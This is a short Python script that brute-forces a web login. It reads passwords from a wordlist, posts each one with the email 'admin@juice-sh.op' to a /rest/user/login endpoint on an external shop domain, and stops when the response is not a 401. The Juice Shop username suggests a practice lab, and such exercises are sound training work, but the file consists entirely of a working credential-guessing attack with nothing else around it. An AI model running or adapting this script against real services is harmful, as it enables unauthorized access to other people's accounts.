from urllib import response
import requests
from termcolor import colored

user = "admin@juice-sh.op"

with open("wordlist.txt", "r") as file:
    passwords = file.readlines()
    

for password in passwords:
    password = password.strip()
    data ={"email" : user, "password": password}
    response = requests.post("http://shop.bancocn.com/rest/user/login", json=data)
    code = response.status_code
    print(colored('E-MAIL(login):{} - {} - Status Code {}'.format(user, password, code), 'blue'))
    
    if code != 401:
        print (colored("[+] PASSWORD FOUND - {}".format(password), "green"))
        break
